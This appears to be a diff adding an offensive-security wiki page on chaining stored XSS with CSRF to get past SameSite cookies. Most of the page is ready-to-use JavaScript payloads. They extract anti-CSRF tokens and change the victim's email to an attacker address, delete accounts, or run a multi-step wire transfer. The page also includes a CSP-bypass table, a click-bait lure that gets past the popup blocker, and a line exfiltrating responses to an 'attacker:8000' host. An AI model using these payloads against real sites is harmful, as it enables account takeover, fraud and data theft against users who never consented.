@@ -1,0 +1,419 @@
+---
+title: XSS + CSRF Chain
+description: When SameSite cookies block cross-origin CSRF, stage the malicious request from the target's own origin via XSS - the XMLHttpRequest pattern that fetches a page containing the anti-CSRF token, extracts it with regex, and issues the authenticated state-change in one same-origin script.
+mitre: [T1212, T1185, T1059.007]
+d3fend: [D3-CBV, D3-IAA]
+impact: [SessionTakeover, AccountTakeover]
+owasp: [A03, A01]
+sidebar:
+  order: 8
+  label: XSS + CSRF Chain
+---
+
+## TL;DR
+
+`SameSite=Lax` (the modern browser default) blocks classic cross-origin CSRF. But it doesn't block requests made *from the target's own origin* - which is exactly what XSS enables. Stage the entire CSRF inside the target via XSS: fetch the form page, extract the CSRF token via regex on the response, send the state-change request with the token. All same-origin, all carries the victim's cookies, all passes anti-CSRF.
+
+```javascript
+// The canonical XSS-to-CSRF pattern, in one block
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET', '/account/change-email', true);
+req.send();
+
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/account/change-email', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf=' + token + '&email=attacker@evil.com');
+}
+```
+
+Success indicator: the action's side effect happens on the victim's account when they visit the page containing the XSS payload - and your network listener / Burp Repeater confirms the response came from the target's own origin, not from an external attacker domain.
+
+## Why this chain matters
+
+In 2020-2021, all major browsers shifted the default `SameSite` for cookies from "None" to "Lax." This single change broke a lot of CSRF attacks overnight - cross-site `<form>` submissions, image-tag GETs, and XHR with credentials all stopped carrying cookies in the default case.
+
+But XSS is *same-origin* by definition: a script running on `target.com` is allowed to make `target.com` requests with credentials. SameSite is silent on this case because SameSite is a cross-*site* defense, not a cross-*origin* one. So the modern session-attack pattern in well-defended apps is:
+
+1. Find XSS on the target (often via stored XSS in a profile / comment / signature)
+2. Use the XSS to perform CSRF-equivalent actions
+
+The chain replaces cross-origin CSRF with same-origin XHR. SameSite blocks the former, allows the latter.
+
+## The two-request pattern
+
+State-changing actions usually require a fresh CSRF token. Modern frameworks rotate them per-request, so the token your XSS captured at injection time may be invalid by the time you fire. The robust pattern is:
+
+1. **GET** the form page (any page that contains an up-to-date CSRF token for the target action)
+2. **Parse** the token from the response HTML
+3. **POST** the state-change request with the fresh token
+
+This needs two XHRs chained together via `onload`.
+
+### Full anatomy
+
+```javascript
+// Request 1 - fetch the page containing the CSRF token
+var fetchReq = new XMLHttpRequest();
+fetchReq.onload = handleFetch;
+fetchReq.open('GET', '/account/change-email', true);
+fetchReq.send();
+
+// Handler - runs once Request 1's response arrives
+function handleFetch() {
+    // Extract the CSRF token from the HTML
+    var match = this.responseText.match(/name="csrf"\s+value="(\w+)"/);
+    if (!match) return;
+    var token = match[1];
+
+    // Request 2 - fire the state-change with the fresh token
+    var actionReq = new XMLHttpRequest();
+    actionReq.open('POST', '/account/change-email', true);
+    actionReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    actionReq.send('csrf=' + encodeURIComponent(token) +
+                   '&email=' + encodeURIComponent('attacker@evil.com'));
+}
+```
+
+Both requests are same-origin (relative URLs, same scheme/host/port), so:
+
+- Cookies attached automatically - including any `SameSite=Strict` ones
+- CORS doesn't apply - both endpoints are on the target
+- Read access to response - JavaScript reads `responseText` of the first request without restriction
+
+The token extraction is the only fragile part. The regex must match the *exact* HTML format of the token's container.
+
+## Token-extraction regex patterns
+
+The CSRF token is embedded somewhere in the HTML. Common patterns:
+
+### Hidden form input
+
+```html
+<input type="hidden" name="csrf" value="9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d">
+```
+
+Regex: `name="csrf"\s+value="(\w+)"` or `value="([a-f0-9]{32})"` (length-specific)
+
+```javascript
+var token = this.responseText.match(/name="csrf"\s+value="(\w+)"/)[1];
+```
+
+The `\w+` matches word characters (letters, digits, underscore). For hex-only tokens, `[a-f0-9]+`. For base64, `[A-Za-z0-9+/=]+`.
+
+### Meta tag (common in SPAs)
+
+```html
+<meta name="csrf-token" content="9a8b7c6d5e4f3a2b1c0d">
+```
+
+```javascript
+var token = document.querySelector('meta[name="csrf-token"]').content;
+// or via regex on fetched HTML:
+var token = this.responseText.match(/<meta\s+name="csrf-token"\s+content="(\w+)"/)[1];
+```
+
+When you can use `document.querySelector` (the form is on the current page rather than fetched), the DOM query is cleaner than regex.
+
+### JavaScript variable
+
+```html
+<script>
+window.csrfToken = "9a8b7c6d5e4f3a2b1c0d";
+</script>
+```
+
+```javascript
+var token = this.responseText.match(/csrfToken\s*=\s*["'](\w+)["']/)[1];
+```
+
+Or, if you're on the same page already and the variable is set globally:
+
+```javascript
+var token = window.csrfToken;
+```
+
+### HTTP header
+
+Some apps embed the token in a custom HTTP response header rather than the body:
+
+```http
+HTTP/1.1 200 OK
+X-CSRF-Token: 9a8b7c6d5e4f3a2b1c0d
+```
+
+```javascript
+var token = this.getResponseHeader('X-CSRF-Token');
+```
+
+### Cookie
+
+If the app uses double-submit cookie:
+
+```javascript
+var token = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
+```
+
+This is common in Angular apps (which look for `XSRF-TOKEN` cookie and copy it into an `X-XSRF-TOKEN` header on requests). When the cookie is non-HttpOnly (it has to be, for the JS to read it), XSS reads it the same way.
+
+## Adapting to different request signatures
+
+### JSON API endpoints
+
+When the target uses JSON for the state change:
+
+```javascript
+var fetchReq = new XMLHttpRequest();
+fetchReq.onload = handleFetch;
+fetchReq.open('GET', '/api/csrf', true);   // some endpoint that returns the token
+fetchReq.send();
+
+function handleFetch() {
+    var token = JSON.parse(this.responseText).csrf_token;
+
+    var actionReq = new XMLHttpRequest();
+    actionReq.open('POST', '/api/account', true);
+    actionReq.setRequestHeader('Content-Type', 'application/json');
+    actionReq.setRequestHeader('X-CSRF-Token', token);   // Some APIs use header
+    actionReq.send(JSON.stringify({
+        email: 'attacker@evil.com'
+    }));
+}
+```
+
+JSON APIs often:
+
+- Provide a dedicated `/api/csrf` or `/api/me` endpoint that returns the token
+- Want the token in a header (`X-CSRF-Token`) rather than in the body
+- Sometimes verify `Content-Type: application/json` strictly (matters more for cross-origin defense; from same-origin XSS, you just set it)
+
+### Custom session/state APIs
+
+For apps where the action requires more than a token + value (e.g., a separate session ID for the action, a server-issued nonce):
+
+```javascript
+var fetchReq = new XMLHttpRequest();
+fetchReq.onload = function() {
+    var resp = JSON.parse(this.responseText);
+    var token  = resp.csrf;
+    var actionId = resp.actionId;     // some per-action nonce
+
+    var actionReq = new XMLHttpRequest();
+    actionReq.open('POST', '/api/action', true);
+    actionReq.setRequestHeader('Content-Type', 'application/json');
+    actionReq.send(JSON.stringify({
+        csrf: token,
+        actionId: actionId,
+        payload: {email: 'attacker@evil.com'}
+    }));
+};
+fetchReq.open('GET', '/api/action/prepare', true);
+fetchReq.send();
+```
+
+When the API has multi-step preparation, the XSS payload mirrors it step-by-step. Each step is `req.onload = nextStep` chained together.
+
+## Stored XSS as the delivery vehicle
+
+The whole pattern works best with *stored* XSS - payload sitting in the application waiting to fire on every viewer.
+
+### Common stored-XSS locations
+
+| Location | Audience | Useful for |
+| --- | --- | --- |
+| Profile bio / "About me" | Anyone viewing the profile | Targeted attacks (lure the victim to your profile) |
+| Profile name / display name | Any page showing the user (comments, "online users" widget, admin user list) | Wide reach including admin-viewing surface |
+| Forum signature | Every post the user makes | High-volume reach |
+| Comment field on a popular post | Anyone reading the comment | High-volume reach |
+| Username | Any list view of users | Wide reach |
+| Support ticket body | Support staff viewing the ticket | Targets admin-equivalent staff |
+| "Country" / freeform user fields | Any page rendering them | HTB-style scenario |
+
+The HTB-style "Country" field in a user profile is a recurring pattern - apps that don't expect HTML in fields like that often render them unsanitized.
+
+### Picking the right XSS landing page
+
+The XSS payload runs when the affected page loads. Pick a payload-host page that an admin or other high-privilege user is likely to view:
+
+- A "share my profile" public URL → lure admin via support request
+- A signature on a post → high-traffic discussion forum
+- A username appearing in admin "user list" → fires whenever admin reviews users
+
+When the affected page isn't admin-accessible, the chain stops at "compromise the user whose page it is" - still useful but lower-impact.
+
+## Defeating the popup blocker
+
+When the XSS payload needs to open another window (e.g., to host a callback iframe), modern browsers block `window.open` unless the call is in response to user interaction. The HTB-style workaround:
+
+```html
+<h1>Click here to win!</h1>
+<button onclick="goPwn()">Start!</button>
+<script>
+function goPwn() {
+    // window.open works here because we're in a click handler
+    window.open('http://target/account/change-visibility');
+    setTimeout(actualAttack, 2000);
+}
+
+function actualAttack() {
+    var token = computeToken('victim_username');   // weak-token scenario
+    window.location = `http://target/account/change-visibility/confirm?csrf=${token}&action=change`;
+}
+</script>
+```
+
+The `<button onclick>` provides the user-interaction context that browsers require for window.open. Once the victim clicks, the script can do everything that needed that gesture.
+
+## Defeating CSP
+
+If the target has a Content Security Policy that restricts script execution, the XSS-CSRF chain has additional hurdles:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM123'; ...
+```
+
+This CSP only allows scripts that:
+- Are loaded from same-origin (`'self'`)
+- Have the right nonce (`'nonce-RANDOM123'`)
+
+To run JavaScript at all, you need a CSP bypass. Common avenues:
+
+| CSP weakness | Bypass |
+| --- | --- |
+| Allows `'unsafe-inline'` | Inject `<script>...</script>` directly |
+| Has nonce but the nonce is exposed in the DOM | Read nonce, inject script with same nonce |
+| Allows specific CDNs | Inject `<script src="https://CDN/jsonp-callback?cb=alert">` |
+| Allows `'self'` and target has a JSONP-style endpoint | Same as above but using target's own endpoint |
+| `strict-dynamic` and you can inject one whitelisted script | The first script can `document.createElement('script')` to introduce more |
+
+When CSP is well-designed, the XSS→CSRF chain breaks not because the chain itself is wrong but because the XSS step can't fire. The bypass story is then about CSP itself.
+
+## The HTB-style worked example
+
+A profile-page XSS in a "Country" field that fires when anyone views the profile, targeting the "change visibility" action. The change-visibility flow:
+
+1. GET `/app/change-visibility` returns a confirmation page with the CSRF token embedded
+2. POST `/app/change-visibility` with `csrf=TOKEN&action=change` toggles public/private
+
+Payload placed in the Country field:
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/change-visibility',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/change-visibility', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token+'&action=change');
+};
+</script>
+```
+
+Reading this script line by line:
+
+| Line | Effect |
+| --- | --- |
+| `var req = new XMLHttpRequest()` | Create the first XHR object |
+| `req.onload = handleResponse` | When the response arrives, call handleResponse |
+| `req.open('get','/app/change-visibility',true)` | Prep a GET to the action page (true = async) |
+| `req.send()` | Fire the GET request |
+| `var token = this.responseText.match(/...)/)[1]` | Inside handler, regex out the CSRF token |
+| `changeReq.open('post', '/app/change-visibility', true)` | Prep POST |
+| `setRequestHeader(...)` | Set body content-type |
+| `changeReq.send('csrf=...&action=change')` | Fire the state change |
+
+Victim viewing the profile triggers both XHRs. The state change happens on the victim's account because both XHRs carry the victim's cookies (same-origin). SameSite=Lax doesn't apply because the requests are same-origin/same-site.
+
+### Adapting to delete-account
+
+The HTB extra-practice: adapt the payload to delete the victim's account. The delete endpoint is `POST /app/delete` with `csrf=TOKEN` (and email-bound URL `/app/delete/<email>`):
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/app/delete', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    changeReq.send('csrf='+token);
+};
+</script>
+```
+
+Same skeleton, different URLs, fewer parameters. The pattern is reusable for any single-action endpoint.
+
+## Multi-step actions
+
+For actions requiring N steps (initiate → confirm → execute), chain N XHRs:
+
+```javascript
+function step1() {
+    var r = new XMLHttpRequest();
+    r.onload = step2;
+    r.open('GET', '/api/wire-transfer/initiate', true);
+    r.send();
+}
+
+function step2() {
+    var token = JSON.parse(this.responseText).csrf;
+    var r = new XMLHttpRequest();
+    r.onload = step3.bind(null, token);   // pass token to step3
+    r.open('POST', '/api/wire-transfer/setup', true);
+    r.setRequestHeader('Content-Type', 'application/json');
+    r.send(JSON.stringify({to: 'attacker_account', amount: 10000, csrf: token}));
+}
+
+function step3(setupToken) {
+    var confirmation = JSON.parse(this.responseText).confirmation;
+    var r = new XMLHttpRequest();
+    r.open('POST', '/api/wire-transfer/confirm', true);
+    r.setRequestHeader('Content-Type', 'application/json');
+    r.send(JSON.stringify({confirmation: confirmation, csrf: setupToken}));
+}
+
+step1();
+```
+
+Each step's `onload` triggers the next. The result chains through.
+
+## Verifying success
+
+After the XSS-CSRF chain fires, how do you know it worked?
+
+- **In a live engagement**: visit the victim's account from a different browser session (with the victim's cookie via a separate hijack chain, or after they shared evidence) and confirm the change.
+- **In a lab**: log in as the test victim, check the affected setting.
+- **From the XSS itself**: have the payload exfil the response of the action request to your callback:
+
+  ```javascript
+  changeReq.onload = function() {
+      fetch('http://attacker:8000/?r=' + btoa(this.responseText));
+  };
+  ```
+
+The exfil confirms not just that the request fired but that the response indicated success.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Two-XHR chain | `req.onload = handleNext; req.open(...); req.send();` |
+| Extract token from form | `responseText.match(/name="csrf" value="(\w+)"/)[1]` |
+| Extract token from meta | `document.querySelector('meta[name=csrf-token]').content` |
+| Extract token from cookie | `document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]` |
+| Extract token from response header | `this.getResponseHeader('X-CSRF-Token')` |
+| Set CSRF header on request | `r.setRequestHeader('X-CSRF-Token', token)` |
+| JSON body | `r.send(JSON.stringify({...}))` with `Content-Type: application/json` |
+| Form-encoded body | `r.send('a=1&b=2')` with `application/x-www-form-urlencoded` |
+| User-interaction-required | Place in `<button onclick>` to bypass popup-blocker |
+| Verify success | Exfil response in second `onload` |
